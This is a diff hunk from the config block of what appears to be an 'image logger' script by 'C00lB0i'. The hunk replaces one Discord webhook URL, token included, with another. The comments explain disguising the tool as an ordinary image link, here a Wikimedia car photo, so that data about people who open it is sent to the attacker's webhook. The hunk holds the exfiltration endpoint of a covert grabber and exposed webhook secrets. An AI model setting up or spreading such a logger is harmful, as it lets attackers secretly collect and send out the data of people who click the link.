@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1379841208733667409/bF7RJBdE46vS2bjz0hz_O7CyBqGzeXx31sSyaq9vq2yq7gLUxnsDR0PC5mz53JkW9sLi",
+    "webhook": "https://discord.com/api/webhooks/1379885887831146567/sWep9fb0JBt5ArUeM0qBtamVpPQDA03KreI-AsIVeGwx-6GZC0jcRdBG1LQDCy93RBv9",
     "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Honda_Civic_e-HEV_Sport_%28XI%29_%E2%80%93_f_30062024.jpg/960px-Honda_Civic_e-HEV_Sport_%28XI%29_%E2%80%93_f_30062024.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
